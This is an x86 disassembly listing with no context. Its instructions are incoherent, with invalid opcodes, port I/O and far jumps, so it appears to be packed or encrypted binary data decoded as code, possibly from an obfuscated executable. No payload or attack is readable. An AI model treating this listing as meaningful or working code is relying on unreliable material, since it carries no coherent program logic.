  41d0ce:	fdiv   QWORD PTR [esi-0x7c]
  41d0d1:	in     al,0x92
  41d0d3:	retf   
  41d0d4:	xchg   ecx,eax
  41d0d5:	mov    bl,0xc8
  41d0d7:	test   DWORD PTR [ebx-0x2ffd5679],esp
  41d0dd:	jnp    0x41d0d7
  41d0df:	pop    esi
  41d0e0:	ins    BYTE PTR es:[edi],dx
  41d0e1:	pushf  
  41d0e2:	rcl    BYTE PTR [edx],cl
  41d0e4:	int    0x79
  41d0e6:	outs   dx,DWORD PTR ds:[esi]
  41d0e7:	in     al,dx
  41d0e8:	jnp    0x41d0fb
  41d0ea:	add    ecx,0xca68da38
  41d0f0:	jno    0x41d147
  41d0f2:	stc    
  41d0f3:	cmp    dh,BYTE PTR [ebx-0x79]
  41d0f6:	xor    cl,bl
  41d0f8:	mov    edx,0x61046534
  41d0fd:	mov    bl,0xe1
  41d0ff:	inc    BYTE PTR [edx+0x6f56f40e]
  41d105:	xchg   ebx,eax
  41d106:	mov    eax,ds:0xef5c6dac
  41d10b:	cmp    ebx,edx
  41d10d:	mov    DWORD PTR ds:0x42a321,0x4781
  41d117:	jmp    0x41d629
  41d11c:	(bad)  
  41d11d:	xlat   BYTE PTR ds:[ebx]
  41d11e:	into   
  41d11f:	ror    dh,1
  41d121:	aad    0xc5
  41d123:	xlat   BYTE PTR ds:[ebx]
  41d124:	imul   edi,esp,0xc99a692a
  41d12a:	cdq    
  41d12b:	ins    BYTE PTR es:[edi],dx
  41d12c:	(bad)  
  41d12d:	stos   DWORD PTR es:[edi],eax
  41d12e:	jg     0x41d1a8
  41d130:	jae    0x41d1ae
  41d132:	js     0x41d1ac
  41d134:	push   0x4a
  41d136:	mov    cs,esp
  41d138:	mov    ds:0xbf89edc,al
  41d13d:	scas   eax,DWORD PTR es:[edi]
  41d13e:	fcomp  QWORD PTR ds:0x26976ded
  41d144:	sub    al,0x45
  41d146:	sbb    ch,BYTE PTR [ebx*4+0x5431c18c]
  41d14d:	nop
  41d14e:	or     dh,BYTE PTR [edx]
  41d150:	adc    bl,dl
  41d152:	push   esi
  41d153:	test   BYTE PTR ds:0x7277,0x5b
  41d159:	mov    bl,0x92
  41d15b:	ins    DWORD PTR es:[edi],dx
  41d15c:	push   edi
  41d15d:	and    ah,BYTE PTR [eax+0x16]
  41d160:	popf   
  41d161:	sub    BYTE PTR [ebx-0x31],dl
  41d164:	(bad)  
  41d165:	fsubr  QWORD PTR ds:0xb76dec44
  41d16b:	xchg   esp,esp
  41d16d:	mov    gs,WORD PTR [ecx-0x56753e7f]
  41d173:	pop    eax
  41d174:	push   ebx
  41d175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d176:	sub    eax,0xa110435a
  41d17b:	icebp  
  41d17c:	inc    DWORD PTR [ebx-0x14]
  41d17f:	and    bh,bl
  41d181:	daa    
  41d182:	scas   eax,DWORD PTR es:[edi]
  41d183:	push   es
  41d184:	lods   eax,DWORD PTR ds:[esi]
  41d185:	std    
  41d186:	outs   dx,BYTE PTR ds:[esi]
  41d187:	sub    al,BYTE PTR [ebx-0x18fa91fc]
  41d18d:	in     eax,dx
  41d18e:	adc    al,0x3a
  41d190:	and    eax,DWORD PTR [ecx-0x2bb0b46e]
  41d196:	mov    BYTE PTR [ebx],bl
  41d198:	sbb    al,BYTE PTR [eax]
  41d19a:	lea    ecx,[esi+0x20]
  41d19d:	fnstenv [ebx-0x1c267d59]
  41d1a3:	and    esi,ecx
  41d1a5:	stc    
  41d1a6:	clc    
  41d1a7:	xor    BYTE PTR [ecx+ebx*8-0x1f],ch
  41d1ab:	(bad)  
  41d1ae:	sbb    edx,ebp
  41d1b0:	mov    esp,0x20b3e6c2
  41d1b5:	stc    
  41d1b6:	sbb    DWORD PTR [edi+esi*4+0x50],0x59
  41d1bb:	stc    
  41d1bc:	jg     0x41d144
  41d1be:	sbb    eax,0x20d39581
  41d1c3:	cmp    al,ah
  41d1c5:	ret    
  41d1c6:	shl    BYTE PTR es:[ecx+0xe],1
  41d1ca:	repz adc BYTE PTR [edi-0x1cda9319],cl
  41d1d1:	cmp    al,0x19
  41d1d3:	dec    ebx
  41d1d4:	aas    
  41d1d5:	inc    edx
  41d1d6:	lods   eax,DWORD PTR ds:[esi]
  41d1d7:	ret    
  41d1d8:	outs   dx,BYTE PTR ds:[esi]
  41d1d9:	mov    ds:0x1d61bbaf,eax
  41d1de:	sbb    eax,0xf3ff7ad4
  41d1e3:	xlat   BYTE PTR ds:[ebx]
  41d1e4:	dec    esi
  41d1e5:	test   eax,0xb4f9465
  41d1ea:	xchg   ecx,eax
  41d1eb:	dec    ebp
  41d1ec:	or     eax,0x80470a11
  41d1f1:	sub    eax,0x2adf0fe6
  41d1f6:	fist   WORD PTR [eax+0x6143b725]
  41d1fc:	pop    esi
  41d1fd:	pop    edi
  41d1fe:	push   cs
  41d1ff:	dec    esp
  41d200:	mov    al,0x3c
  41d202:	nop
  41d203:	cdq    
  41d204:	or     dh,0xd7
  41d207:	pop    edx
  41d208:	fs shr cl,cl
  41d20b:	cs outs dx,DWORD PTR es:[esi]
  41d20e:	xor    al,0xb3
  41d210:	pop    edx
  41d211:	ins    DWORD PTR es:[edi],dx
  41d212:	sbb    BYTE PTR [edi+0x6336c7e1],al
  41d218:	mov    ds:0xc84a37f4,al
  41d21d:	add    eax,0xa2433cf5
  41d222:	outs   dx,DWORD PTR ds:[esi]
  41d223:	xchg   ecx,eax
  41d224:	fldcw  WORD PTR [eax-0x4ef7c6b0]
  41d22a:	stos   BYTE PTR es:[edi],al
  41d22b:	xchg   BYTE PTR [edx-0x42],al
  41d22e:	fnstcw WORD PTR [ebx-0x3cf04c7f]
  41d234:	retf   
  41d235:	and    esp,DWORD PTR [esi+0x5]
  41d238:	ss pop ebp
  41d23a:	jge    0x41d224
  41d23c:	dec    ebx
  41d23d:	aad    0xc2
  41d23f:	sbb    ebp,DWORD PTR [ecx-0x10c511e9]
  41d245:	push   cs
  41d246:	sar    BYTE PTR [ebx-0x33ce0cdb],1
  41d24c:	add    eax,0x63c7579
  41d251:	sub    esp,esi
  41d253:	push   es
  41d254:	ins    BYTE PTR es:[edi],dx
  41d255:	shl    DWORD PTR fs:[esp+ebp*2],0xe8
  41d25a:	fwait
  41d25b:	push   ss
  41d25c:	js     0x41d270
  41d25e:	jne    0x41d262
  41d260:	into   
  41d261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d262:	scas   eax,DWORD PTR es:[edi]
  41d263:	jnp    0x41d2a9
  41d265:	scas   al,BYTE PTR es:[edi]
  41d266:	fld    TBYTE PTR [ecx-0x791e5c3]
  41d26c:	imul   edx,DWORD PTR [esi+0x128872e8],0x6817251a
  41d276:	cdq    
  41d277:	cmp    al,0x8
  41d279:	and    dl,0x43
  41d27c:	arpl   dx,si
  41d27e:	push   ecx
  41d27f:	mov    esp,0x589e5765
  41d284:	lods   al,BYTE PTR ds:[esi]
  41d285:	mov    ecx,esi
  41d287:	mov    bh,0x12
  41d289:	sub    al,0x9e
  41d28b:	mov    BYTE PTR [ecx],dh
  41d28d:	pop    ebp
  41d28e:	inc    ecx
  41d28f:	pushf  
  41d290:	ja     0x41d2a8
  41d292:	imul   edi,DWORD PTR [edi-0x787cd08c],0x29b208a0
  41d29c:	shl    ebx,cl
  41d29e:	mov    edi,0x283583f7
  41d2a3:	loopne 0x41d302
  41d2a5:	adc    DWORD PTR [esi],ebp
  41d2a7:	sub    al,BYTE PTR [ebp-0x7c]
  41d2aa:	popa   
  41d2ab:	push   ss
  41d2ac:	(bad)  
  41d2ad:	js     0x41d2ad
  41d2af:	es loopne 0x41d2d0
  41d2b2:	pop    edi
  41d2b3:	xor    eax,0x34d4aceb
  41d2b8:	add    al,0xac
  41d2ba:	push   esi
  41d2bb:	je     0x41d2a0
  41d2bd:	xor    BYTE PTR [esi],0x2a
  41d2c0:	dec    edx
  41d2c1:	gs jle 0x41d25c
  41d2c4:	ds ds aad 0xa5
  41d2c8:	jl     0x41d257
  41d2ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2cb:	pop    ebp
  41d2cc:	fbld   TBYTE PTR [ebp-0x387e83fb]
  41d2d2:	jbe    0x41d25c
  41d2d4:	mov    ebp,0xd773604d
  41d2d9:	repnz mov al,dh
  41d2dc:	retf   
  41d2dd:	out    0x6b,eax
  41d2df:	and    DWORD PTR [edi+0x14a3aabf],ebx
  41d2e5:	inc    ebx
  41d2e6:	inc    ecx
  41d2e7:	sti    
  41d2e8:	out    dx,eax
  41d2e9:	enter  0x34a,0x38
  41d2ed:	push   eax
  41d2ee:	jp     0x41d2be
  41d2f0:	std    
  41d2f1:	jl     0x41d2d1
  41d2f3:	push   esi
  41d2f4:	into   
  41d2f5:	mov    ds:0xc8786823,eax
  41d2fa:	push   eax
  41d2fb:	mov    ecx,0x6915ecb1
  41d300:	jecxz  0x41d309
  41d302:	xor    al,BYTE PTR [edi+0x28]
  41d305:	aad    0xf8
  41d307:	xchg   ebx,eax
  41d308:	fwait
  41d309:	call   0xd399d38c
  41d30e:	mov    ecx,0xbce85394
  41d313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d314:	inc    ecx
  41d315:	pop    esp
  41d316:	popa   
  41d317:	call   0xf40b077a
  41d31c:	jg     0x41d2b3
  41d31e:	dec    edx
  41d31f:	adc    al,0x33
  41d321:	inc    ebx
  41d322:	rcl    BYTE PTR [edx+0x2d],1
  41d325:	imul   ecx,ebp,0x16
  41d328:	iret   
  41d329:	mov    ds:0x506fdbd5,eax
  41d32e:	data16 icebp 
  41d330:	ret    
  41d331:	jns    0x41d2f0
  41d333:	(bad)  
  41d334:	or     DWORD PTR [esi-0x79b2694a],ebp
  41d33a:	or     al,cl
  41d33c:	sbb    ah,BYTE PTR [esi+esi*1+0x3987723e]
  41d343:	enter  0xa5d9,0x7a
  41d347:	mov    eax,ds:0xddaf92e1
  41d34c:	icebp  
  41d34d:	loop   0x41d391
  41d34f:	outs   dx,DWORD PTR ds:[esi]
  41d350:	aas    
  41d351:	repz fst DWORD PTR cs:[eax]
  41d355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d356:	pop    ebp
  41d357:	sub    al,0x45
  41d359:	or     eax,0x55bddd0c
  41d35e:	(bad)  
  41d35f:	and    edx,esi
  41d361:	inc    ebp
  41d362:	add    DWORD PTR [esp+eax*1],esi
  41d365:	gs enter 0xaa73,0x50
  41d36a:	sub    eax,0x166c5c38
  41d36f:	fwait
  41d370:	pop    ebp
  41d371:	pop    ds
  41d372:	sub    esi,ebx
  41d374:	xchg   edi,eax
  41d375:	clc    
  41d376:	shr    BYTE PTR [esi+ecx*8],1
  41d379:	lea    edi,[ebx+0x5b]
  41d37c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d37d:	jmp    0x8b30:0x1710d787
  41d384:	inc    edx
  41d385:	out    0x8d,al
  41d387:	xchg   BYTE PTR [esi],dl
  41d389:	jnp    0x41d372
  41d38b:	ins    DWORD PTR es:[edi],dx
  41d38c:	adc    DWORD PTR [ebx+0x7c],edx
  41d38f:	or     eax,0x627703ea
  41d394:	cmp    bh,ch
  41d396:	and    BYTE PTR ds:0x7d314ceb,bl
  41d39c:	adc    bl,BYTE PTR [ebx+0x53d7c1be]
  41d3a2:	pop    ds
  41d3a3:	push   cs
  41d3a4:	and    DWORD PTR [esi-0x27b678e3],0x6b37891c
  41d3ae:	test   dl,cl
  41d3b0:	sbb    al,0x4
  41d3b2:	push   ss
  41d3b3:	add    al,0x4d
  41d3b5:	sti    
  41d3b6:	call   0xa146:0xafd70fb
  41d3bd:	fstp   DWORD PTR [eax+edx*8]
  41d3c0:	xchg   BYTE PTR [ebp+0x9],bh
  41d3c3:	sbb    BYTE PTR [ebp-0x6e74c072],dl
  41d3c9:	inc    ecx
  41d3ca:	jbe    0x41d41a
  41d3cc:	cwde   
  41d3cd:	fidiv  DWORD PTR [ebx+edx*1+0x3dc125ff]
  41d3d4:	xchg   esp,eax
  41d3d5:	sbb    dl,BYTE PTR [edx]
  41d3d7:	pop    ecx
  41d3d8:	sti    
  41d3d9:	inc    edx
  41d3da:	test   BYTE PTR [ecx+0x4b710013],bh
  41d3e0:	jge    0x41d3e2
  41d3e2:	push   ecx
  41d3e3:	loop   0x41d369
  41d3e5:	test   al,0xc3
  41d3e7:	add    al,0x38
  41d3e9:	or     DWORD PTR [edi],edi
  41d3eb:	and    DWORD PTR [ebx],ebx
  41d3ed:	fs jb  0x41d3d7
  41d3f0:	aam    0x0
  41d3f2:	sbb    bh,0xae
  41d3f5:	and    eax,0x9afb495f
  41d3fa:	ja     0x41d43f
  41d3fc:	dec    ecx
  41d3fd:	nop    DWORD PTR [ebx-0xb03c0df]
  41d404:	sub    al,0x92
  41d406:	xchg   esi,eax
  41d407:	fadd   QWORD PTR [eax+ebp*8+0x31]
  41d40b:	mov    dl,BYTE PTR [ebx]
  41d40d:	(bad)  [esi+0x47]
  41d410:	mov    bl,BYTE PTR [edi]
  41d412:	ret    0x318f
  41d415:	pop    eax
  41d416:	cmp    BYTE PTR [ecx+0x52],ch
  41d419:	mov    eax,0x1d2d7817
  41d41e:	mov    cl,0x17
  41d420:	pop    eax
  41d421:	dec    esp
  41d422:	pop    ss
  41d423:	std    
  41d424:	in     al,dx
  41d425:	arpl   bx,bx
  41d427:	sub    eax,0x56877c97
  41d42c:	bound  eax,QWORD PTR [edx]
  41d42e:	push   ecx
  41d42f:	ins    DWORD PTR es:[edi],dx
  41d430:	lahf   
  41d431:	gs ss data16 int3 
  41d435:	sbb    DWORD PTR [esi],0xffffffaf
  41d438:	cwde   
  41d439:	adc    BYTE PTR [esi-0x3b49a6b9],0xba
  41d440:	test   eax,0xbfc0546f
  41d445:	pop    esi
  41d446:	or     esp,DWORD PTR [ecx+0x6ca64eba]
  41d44c:	cmp    eax,0x58434811
  41d451:	push   ax
  41d453:	sub    eax,0x73c98a03
  41d458:	sub    DWORD PTR [ecx+0x224d385a],eax
  41d45e:	mov    esi,DWORD PTR [eax]
  41d460:	addr16 ds repz push ebp
  41d464:	sub    eax,0x9fb0c061
  41d469:	push   edi
  41d46a:	sbb    al,BYTE PTR [ebx+0x38ea6906]
  41d470:	or     BYTE PTR [edi-0x72],bh
  41d473:	fdiv   st(7),st
  41d475:	js     0x41d42a
  41d477:	add    DWORD PTR [edi+0x22dc690c],0x5a
  41d47e:	lods   eax,DWORD PTR ds:[esi]
  41d47f:	sub    bh,cl
  41d481:	sub    al,0xaa
  41d483:	mov    bl,BYTE PTR [edx]
  41d485:	(bad)  [ebx]
  41d487:	jmp    0x333fe06f
  41d48c:	(bad)  
  41d48d:	loope  0x41d479
  41d48f:	out    dx,eax
  41d490:	bound  esp,QWORD PTR [edi+0x30]
  41d493:	inc    ebp
  41d494:	xor    ch,BYTE PTR [esi-0x1daf532a]
  41d49a:	fldenv [ebx-0xd]
  41d49d:	inc    DWORD PTR [ebx]
  41d49f:	and    eax,0xc68f5cb2
  41d4a4:	and    edi,DWORD PTR [ebp-0x295d74e]
  41d4aa:	call   0xd953:0x8c7025a9
  41d4b1:	ror    DWORD PTR [edi],0x80
  41d4b4:	out    0x12,al
  41d4b6:	inc    esp
  41d4b7:	push   es
  41d4b8:	mov    edi,DWORD PTR [eax+0x7016f4af]
  41d4be:	mov    esp,DWORD PTR [ecx*2+0x759934af]
  41d4c5:	aad    0xa2
  41d4c7:	jbe    0x41d495
  41d4c9:	cmp    eax,0xf7b197c
  41d4ce:	int    0x42
  41d4d0:	push   edx
  41d4d1:	rcl    DWORD PTR [esi-0x5e],cl
  41d4d4:	out    dx,al
  41d4d5:	lods   eax,DWORD PTR ds:[esi]
  41d4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4d7:	leave  
  41d4d8:	mov    esi,0xc370d73b
  41d4dd:	enter  0xbf44,0x68
  41d4e1:	int3   
  41d4e2:	or     DWORD PTR [eax+eiz*2],esp
  41d4e5:	pop    eax
  41d4e6:	rcr    BYTE PTR [edx+0x1dd6c517],0x90
  41d4ed:	shl    BYTE PTR [esi+0x7a],1
  41d4f0:	jle    0x41d483
  41d4f2:	dec    eax
  41d4f3:	sbb    al,0x9f
  41d4f5:	sbb    eax,0xba595001
  41d4fa:	push   ds
  41d4fb:	repnz fdiv QWORD PTR [edx+0x1cbe9c5d]
  41d502:	out    dx,eax
  41d503:	mov    WORD PTR [edx-0x63faf421],ds
  41d509:	clc    
  41d50a:	addr16 std 
  41d50c:	inc    DWORD PTR [ebx-0x10]
  41d50f:	or     al,0xd7
  41d511:	inc    ebx
  41d512:	pop    ds
  41d513:	cdq    
  41d514:	and    eax,0xabd7b78
  41d519:	mov    DWORD PTR [eax],0x332a443
  41d51f:	pop    es
  41d520:	xor    eax,0xc789e106
  41d525:	inc    edi
  41d526:	push   eax
  41d527:	fdiv   DWORD PTR [eax+0x5720862]
  41d52d:	sti    
  41d52e:	cmc    
  41d52f:	jle    0x41d4d5
  41d531:	add    ecx,DWORD PTR [eax]
  41d533:	push   esp
  41d534:	sub    eax,0x41b23ccf
  41d539:	leave  
  41d53a:	aam    0x6b
  41d53c:	xchg   edx,eax
  41d53d:	pop    ecx
  41d53e:	outs   dx,BYTE PTR ds:[esi]
  41d53f:	mov    ch,0xe2
  41d541:	pop    esi
  41d542:	push   esi
  41d543:	xor    al,0x0
  41d545:	mov    al,cl
  41d547:	push   ds
  41d548:	push   esp
  41d549:	inc    edi
  41d54a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d54b:	test   DWORD PTR [eax],esi
  41d54d:	mov    ebp,0x9d4362ec
  41d552:	sbb    ah,bh
  41d554:	in     eax,0x7a
  41d556:	scas   eax,DWORD PTR es:[edi]
  41d557:	nop
  41d558:	fdivp  st(7),st
  41d55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d55b:	lsl    ebp,ax
  41d55e:	dec    ebp
  41d55f:	push   esi
  41d560:	mov    eax,ds:0xbcbbb9a
  41d565:	mov    BYTE PTR [edi-0x16c82958],cl
  41d56b:	and    al,0xe2
  41d56d:	jl     0x41d598
  41d56f:	fwait
  41d570:	outs   dx,BYTE PTR ds:[esi]
  41d571:	or     esi,0x41
  41d574:	loope  0x41d565
  41d576:	int    0x76
  41d578:	mov    al,0xd4
  41d57a:	jp     0x41d523
  41d57c:	ja     0x41d5c6
  41d57e:	call   DWORD PTR [edi+0x8]
  41d581:	ret    0x1613
  41d584:	or     ch,BYTE PTR [ebp+0x3c]
  41d587:	mov    al,0xfc
  41d589:	je     0x41d50f
  41d58b:	cmp    eax,0xeab49d9f
  41d590:	jl     0x41d5ec
  41d592:	sbb    BYTE PTR gs:[edx-0x5dd84cb6],cl
  41d599:	jb     0x41d570
  41d59b:	mov    al,0xcc
  41d59d:	je     0x41d58d
  41d59f:	test   DWORD PTR [esi],ebx
  41d5a1:	nop
  41d5a2:	pop    edi
  41d5a3:	xchg   edx,eax
  41d5a4:	mov    ?,WORD PTR [eax+0x625bd50f]
  41d5aa:	push   es
  41d5ab:	ins    BYTE PTR es:[edi],dx
  41d5ac:	pcmpeqb mm2,QWORD PTR [edi+0xc]
  41d5b0:	xchg   ecx,eax
  41d5b1:	dec    edi
  41d5b2:	into   
  41d5b3:	leave  
  41d5b4:	pop    eax
  41d5b5:	sub    DWORD PTR [edi+eiz*2+0x1d],esp
  41d5b9:	sub    eax,0xfaf5607f
  41d5be:	and    BYTE PTR [ecx+0x6a],bl
  41d5c1:	inc    eax
  41d5c2:	add    esi,esi
  41d5c4:	in     al,0xb0
  41d5c6:	push   ebx
  41d5c7:	retf   0xbc4e
  41d5ca:	jno    0x41d5a8
  41d5cc:	push   ebp
  41d5cd:	xchg   edx,eax
  41d5ce:	mov    eax,ds:0x26a6a1b4
  41d5d3:	mov    eax,0x52b39535
  41d5d8:	mov    ah,0x5b
  41d5da:	in     al,0xf
  41d5dc:	sbb    esp,DWORD PTR [esi]
  41d5de:	in     eax,0x61
  41d5e0:	std    
  41d5e1:	jl     0x41d619
  41d5e3:	mov    bl,0x42
  41d5e5:	gs or  dh,BYTE PTR es:[ecx-0x7a7fb467]
  41d5ed:	xor    DWORD PTR [edi+ebx*1+0x77c272db],edx
  41d5f4:	popa   
  41d5f5:	pushf  
  41d5f6:	push   DWORD PTR [ecx]
  41d5f8:	push   edi
  41d5f9:	fist   DWORD PTR [ebp-0x41028f4b]
  41d5ff:	mov    al,ds:0x9a94d37
  41d604:	sbb    ecx,DWORD PTR [ecx+0x60727b27]
  41d60a:	push   ecx
  41d60b:	(bad)
  41d610:	push   0xffffffdb
  41d612:	inc    ecx
  41d613:	push   esi
  41d614:	pop    esp
  41d615:	dec    ebx
  41d616:	sbb    BYTE PTR [edx+0x164e4157],ah
  41d61c:	mov    ds:0xdd0e6c7d,al
  41d621:	mov    esi,DWORD PTR [edi+edi*1+0x2e]
  41d625:	arpl   bp,si
  41d627:	test   BYTE PTR [eax+0xf],0x87
  41d62b:	xor    eax,DWORD PTR ds:0x8b4a0000
  41d631:	push   ebp
  41d632:	cld    
  41d633:	xor    edx,eax
  41d635:	sbb    DWORD PTR ds:0x42a3dd,0x42a3a9
  41d63f:	add    edx,ecx
  41d641:	mov    DWORD PTR ds:0x42a2c1,0x3c09
  41d64b:	jmp    0x4228d3
  41d650:	jmp    0x41db62
  41d655:	ror    ch,0xd3
  41d658:	rcr    ecx,1
  41d65a:	rol    esi,1
  41d65c:	(bad)  [edi]
  41d65e:	aad    0x6e
  41d660:	stos   BYTE PTR es:[edi],al
  41d661:	and    al,0x9e
  41d663:	mov    ch,0xb6
  41d665:	sub    BYTE PTR [esi+0x7c73787f],0x78
  41d66c:	js     0x41d642
  41d66e:	inc    esp
  41d66f:	add    DWORD PTR [ecx],esp
  41d671:	jns    0x41d636
  41d673:	mov    al,0x3
  41d675:	xor    ebx,DWORD PTR [edx]
  41d677:	dec    esp
  41d678:	outs   dx,BYTE PTR ds:[esi]
  41d679:	xchg   BYTE PTR [esi],ch
  41d67b:	dec    ebp
  41d67c:	push   edi
  41d67d:	ds ret 0xc703
  41d681:	dec    edx
  41d682:	ja     0x41d606
  41d684:	dec    bh
  41d686:	xlat   BYTE PTR ds:[ebx]
  41d687:	inc    edi
  41d688:	iret   
  41d689:	mov    cl,0x18
  41d68b:	test   DWORD PTR [esi+0xf],esi
  41d68e:	arpl   WORD PTR [esi],ax
  41d690:	pushf  
  41d691:	xchg   edi,eax
  41d692:	cwde   
  41d693:	(bad)  
  41d695:	mov    ds:0x64594ed3,al
  41d69a:	pop    ds
  41d69b:	xlat   BYTE PTR ds:[ebx]
  41d69c:	xchg   ecx,eax
  41d69d:	jb     0x41d70b
  41d69f:	(bad)  
  41d6a0:	js     0x41d69a
  41d6a2:	push   edx
  41d6a3:	(bad)  
  41d6a4:	fucomp st(7)
  41d6a6:	ret    
  41d6a7:	xchg   eax,eax
  41d6a9:	jmp    0x178b:0x61f0e4b
  41d6b0:	stc    
  41d6b1:	cdq    
  41d6b2:	jmp    0x41d66f
  41d6b4:	cmp    DWORD PTR [edi+0x67],edi
  41d6b7:	mov    edi,DWORD PTR [eax+0xefd5223]
  41d6bd:	jge    0x41d6d9
  41d6bf:	mov    dl,0x11
  41d6c1:	pop    ebx
  41d6c2:	das    
  41d6c3:	xchg   edi,eax
  41d6c4:	cdq    
  41d6c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6c6:	pushf  
  41d6c7:	test   eax,0x1963727c
  41d6cc:	adc    bh,dh
  41d6ce:	sbb    esi,esi
  41d6d0:	sub    eax,0x2e85e9b6
  41d6d5:	sbb    eax,0x73244bea
  41d6da:	js     0x41d6b6
  41d6dc:	jmp    0xf5c8:0xa092f5b7
  41d6e3:	in     eax,dx
  41d6e4:	les    esp,FWORD PTR [edx]
  41d6e6:	hlt    
  41d6e7:	repnz cli 
  41d6e9:	sbb    eax,0xef87e675
  41d6ee:	jne    0x41d68a
  41d6f0:	add    BYTE PTR [ebp+0x35339e1a],dh
  41d6f6:	add    edx,DWORD PTR [edi]
  41d6f8:	add    al,0xb8
  41d6fa:	rol    ch,cl
  41d6fc:	std    
  41d6fd:	cmp    BYTE PTR [edx],0x76
  41d700:	sub    eax,0x3b302ea7
  41d705:	jg     0x41d72b
  41d707:	in     al,dx
  41d708:	pop    ecx
  41d709:	sub    ebx,ebx
  41d70b:	push   es
  41d70c:	les    ebp,FWORD PTR [eax+0x869076e]
  41d712:	test   eax,0xc108bd3c
  41d717:	jmp    0xc070:0x1d5fa716
  41d71e:	sbb    eax,0x1ccdadcf
  41d723:	dec    ebp
  41d724:	sbb    eax,0xf02fd091
  41d729:	jne    0x41d747
  41d72b:	inc    edx
  41d72c:	dec    ebx
  41d72d:	stos   DWORD PTR es:[edi],eax
  41d72e:	push   ecx
  41d72f:	and    esp,DWORD PTR [esi-0x55ca8b99]
  41d735:	xchg   esi,eax
  41d736:	pop    ss
  41d737:	mov    eax,0xf8d9a132
  41d73c:	jne    0x41d6c9
  41d73e:	rcr    al,1
  41d740:	mov    eax,ds:0xa57f1043
  41d745:	add    DWORD PTR [edx+0x22],0xd4c3358f
  41d74c:	in     eax,dx
  41d74d:	lods   al,BYTE PTR ds:[esi]
  41d74e:	adc    edi,DWORD PTR [ecx-0x6e]
  41d751:	inc    eax
  41d752:	add    DWORD PTR [edi+0x70],esp
  41d755:	push   0x1db63f91
  41d75a:	add    eax,0x6cf607f2
  41d75f:	imul   esp,DWORD PTR [ecx-0x4d],0x4
  41d763:	sti    
  41d764:	stos   DWORD PTR es:[edi],eax
  41d765:	and    bx,WORD PTR [ebx-0x7f]
  41d769:	mov    esi,0xfe70792b
  41d76e:	pop    ebx
  41d76f:	cmp    BYTE PTR [esi],0x72
  41d772:	adc    eax,0xeefb99a4
  41d777:	popf   
  41d778:	jnp    0x41d719
  41d77a:	retf   
  41d77b:	pop    esp
  41d77c:	adc    edi,edi
  41d77e:	sub    BYTE PTR [ebx],dl
  41d780:	mov    ds:0x66a84a36,eax
  41d785:	mov    al,ds:0x6cf06f71
  41d78a:	sub    BYTE PTR [edx+0x66471a66],0xb7
  41d791:	hlt    
  41d792:	mov    esp,0x2a63b3d0
  41d797:	inc    eax
  41d798:	push   ecx
  41d799:	adc    BYTE PTR ss:[edx+ebx*8+0x7d7c5882],bh
  41d7a1:	inc    ebp
  41d7a2:	or     DWORD PTR [edi+edx*8+0x7cae848a],eax
  41d7a9:	mov    bl,0x24
  41d7ab:	xchg   ebp,eax
  41d7ac:	pusha  
  41d7ad:	push   ebp
  41d7ae:	lock pop ss
  41d7b0:	inc    esp
  41d7b1:	aas    
  41d7b2:	dec    ecx
  41d7b3:	ror    DWORD PTR [ecx-0x75],cl
  41d7b6:	xor    DWORD PTR [ebx+esi*8-0x1b],ebx
  41d7ba:	jbe    0x41d834
  41d7bc:	mov    dl,0x12
  41d7be:	dec    edi
  41d7bf:	mov    esp,ecx
  41d7c1:	sub    DWORD PTR [esi],esp
  41d7c3:	(bad)  
  41d7c5:	cli    
  41d7c6:	out    dx,eax
  41d7c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7c8:	outs   dx,BYTE PTR ds:[esi]
  41d7c9:	mov    ebx,0x6f0981bc
  41d7ce:	fwait
  41d7cf:	push   cs
  41d7d0:	mov    al,0xde
  41d7d2:	xchg   ebx,eax
  41d7d3:	sbb    al,0x0
  41d7d5:	jp     0x41d80e
  41d7d7:	call   DWORD PTR [ebx]
  41d7d9:	or     DWORD PTR [esi+0x7e],ebp
  41d7dc:	mov    bh,0x1d
  41d7de:	sbb    dh,ch
  41d7e0:	pop    ebx
  41d7e1:	fwait
  41d7e2:	jne    0x41d797
  41d7e4:	prefetch BYTE PTR [eax-0x4e20501b]
  41d7eb:	pop    ecx
  41d7ec:	and    al,0x9a
  41d7ee:	sbb    BYTE PTR [eax],bh
  41d7f0:	rol    DWORD PTR [edx],0x6
  41d7f3:	mul    BYTE PTR [edi+eax*4-0x485e66f7]
  41d7fa:	dec    esi
  41d7fb:	adc    esp,edx
  41d7fd:	out    dx,eax
  41d7fe:	stc    
  41d7ff:	stc    
  41d800:	xor    al,0xdc
  41d802:	mov    DWORD PTR [ebp-0x3e1b84a],edi
  41d808:	mov    ebp,0xae07301f
  41d80d:	pop    ss
  41d80e:	xchg   edi,eax
  41d80f:	fdiv   QWORD PTR [ebx]
  41d811:	adc    BYTE PTR [ebp-0x54],cl
  41d814:	aam    0x79
  41d816:	lahf   
  41d817:	xchg   ecx,eax
  41d818:	stos   BYTE PTR es:[edi],al
  41d819:	(bad)  
  41d81b:	xlat   BYTE PTR ds:[ebx]
  41d81c:	jmp    0x7c9eb10c
  41d821:	sub    al,0xf0
  41d823:	inc    esi
  41d824:	dec    eax
  41d825:	inc    edx
  41d826:	out    0x3b,eax
  41d828:	inc    ebx
  41d829:	data16 aas 
  41d82b:	fstp   QWORD PTR [ebp+0x6deef0b6]
  41d831:	test   eax,0x1bd92e4d
  41d836:	iret   
  41d837:	pop    eax
  41d838:	dec    ebx
  41d839:	xor    cl,al
  41d83b:	push   ecx
  41d83c:	fwait
  41d83d:	sub    BYTE PTR [eax+0x11],al
  41d840:	in     eax,dx
  41d841:	add    edi,DWORD PTR ds:0xc4b83bec
  41d847:	mov    edi,ebp
  41d849:	sbb    eax,DWORD PTR [di-0x45d2]
  41d84e:	sbb    bh,BYTE PTR [esi-0x19]
  41d851:	push   ecx
  41d852:	sar    DWORD PTR [ecx+0x29],0x51
  41d856:	jae    0x41d846
  41d858:	cmp    BYTE PTR [esi-0x20],bh
  41d85b:	mov    BYTE PTR [edx-0x3c],al
